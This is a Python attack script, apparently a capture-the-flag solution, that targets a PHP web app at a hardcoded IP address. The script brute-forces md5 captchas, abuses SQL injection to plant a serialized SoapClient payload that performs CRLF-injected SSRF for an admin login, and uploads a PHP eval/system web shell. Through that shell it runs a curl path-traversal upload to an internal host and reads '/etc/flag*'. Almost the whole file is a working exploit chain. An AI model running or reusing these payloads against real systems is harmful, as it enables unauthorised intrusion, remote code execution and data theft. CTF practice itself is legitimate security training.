#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/08/03, 17:11
"""

import requests as req
import re
import json
import hashlib
import random
import commands

local = 0

if local:
    URL = 'http://127.0.0.1:8182'
else:
    URL = 'http://139.180.220.125:11027'


# Username
username = 'vk11'
cookies = {
    "PHPSESSID": username
}
phpsessid = 'vk22'


def md5(content):
    return hashlib.md5(content.encode('utf-8')).hexdigest()


def run_code(arg):
    code = arg[0]
    start = 100000
    end = 10000000
    if len(arg) > 2:
        start = arg[1]
    if len(arg) > 3:
        start = arg[2]
    if not code:
        return False
    while start <= end:
        res = md5(str(start))[:len(code)]
        if res == code:
            return start
        start += 1


def get_code(uri='/index.php?action=login'):
    res = req.get(URL+uri, cookies=cookies)
    if res.status_code == 200:
        html = res.text
        m = re.findall(r'=== (.*?)\)', html)
        if m:
            return m[0]
    return False


def get_code2(cookies, uri='/index.php?action=login'):
    res = req.get(URL+uri, cookies=cookies)
    if res.status_code == 200:
        html = res.text
        m = re.findall(r'=== (.*?)\)', html)
        if m:
            return m[0]
    return False


def register(username, code):
    data = {
        "username": username,
        "password": "123456",
        "code": code
    }
    res = req.post(URL+'/index.php?action=register', data=data,
                   cookies=cookies)
    if res.status_code == 200 and b'Login' in res.text:
        return True
    return False


def login(username, code):
    data = {
        "username": username,
        "password": "123456",
        "code": code
    }
    res = req.post(URL+'/index.php?action=login', data=data,
                   cookies=cookies)
    if res.status_code == 200:
        return True
    return False


def publish(pl):
    data = {
        "signature": pl,
        "mood": "0"
    }
    res = req.post(URL+'/index.php?action=publish', data=data,
                   cookies=cookies)
    if res.status_code == 200:
        return True
    return False


def index(uri='/index.php?action=index'):
    res = req.get(URL+uri, cookies=cookies)
    if res.status_code == 200:
        return True
    return False


def logout(uri='/index.php?action=logout'):
    res = req.get(URL+uri, cookies=cookies)
    if res.status_code == 200:
        return True
    return False


def upload(uri='/index.php?action=publish'):
    f = "@<?php @eval($_POST[1]);@system($_POST[2]);"
    files = [
        ('pic', ('vk.php', f))
    ]
    res = req.post(URL+uri, cookies=cookies, files=files)
    if res.status_code == 200 and 'upload success' in res.content:
        return True
    return False


def shell(pwd, pl):
    data = {
        pwd: pl
    }
    res = req.post(URL+'/upload/vk.php', data=data)
    if res.status_code == 200:
        print(res.content)
        return True
    return False


if __name__ == '__main__':
    print("[+] Fucking Start...")
    print("[+] Username : %s" % username)

    # Logout
    logout()

    # Register
    code = get_code()
    print("[+] Code : %s" % code)
    if code:
        code = run_code([code, 0, 5])
        print("[+] DeCode : %s" % code)
        if register(username, code):
            print("[+] Register success!")

    # Login
    code = get_code()
    print("[+] Code : %s" % code)
    if code:
        code = run_code([code, 0, 5])
        print("[+] DeCode : %s" % code)
        if login(username, code):
            print("[+] Login success!")

    # SOAP Payload
    code = get_code2({"PHPSESSID": phpsessid})
    if code:
        code = run_code([code, 0, 5])
        pp = "username=admin&password=jaivypassword&code={}".format(code)
        ssrf = 'http://127.0.0.1/\x0d\x0a'
        ssrf += 'Content-Length:0\x0d\x0a\x0d\x0a\x0d\x0a'
        ssrf += 'POST /index.php?action=login HTTP/1.1\x0d\x0a'
        ssrf += 'Host: 127.0.0.1\x0d\x0a'
        ssrf += 'Cookie: PHPSESSID={}\x0d\x0a'.format(phpsessid)
        ssrf += 'Content-Type: application/x-www-form-urlencoded\x0d\x0a'
        ssrf += 'Content-Length: {}\x0d\x0a\x0d\x0a{}'.format(len(pp), pp)
        ssrf += '\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a'
        mood = 'O:10:\"SoapClient\":4:{{s:3:\"uri\";s:{}:\"{}\";'.format(
            len(ssrf), ssrf)
        mood += 's:8:\"location\";s:39:\"http://127.0.0.1/index.php?'
        mood += 'action=login\";s:15:\"_stream_context\";i:0;s:13:\"'
        mood += '_soap_version\";i:1;}}'
        mood = '0x'+''.join(map(lambda k: hex(ord(k))[2:].rjust(2, '0'), mood))
        payload = 'a`, {}); -- -'.format(mood)
        # res = commands.getstatusoutput('php x.php %s %s' % (code, c))
        # soap_pl = soap_pl_tmp.format(res[1])
        if publish(payload):
            print("[+] Publish success!")
            if index():
                print("[+] Admin success!")
    # Admin
    cookies = {"PHPSESSID": phpsessid}
    # upload shell
    if upload():
        print("[+] Upload success! - /upload/vk.php")
    # get flag
    # shell(
    #     '2', "ps -ef")
    pl = """curl 'http://172.18.0.2' \
    -F file=@vk.php -F file[1]=v \
    -F file[2]=../../../../../../tmp/vv.php \
    -F 'hello=/tmp/vv.php' \
    -F '1=system(\"cat /etc/flag*\"); '"""
    shell(
        '2', pl)
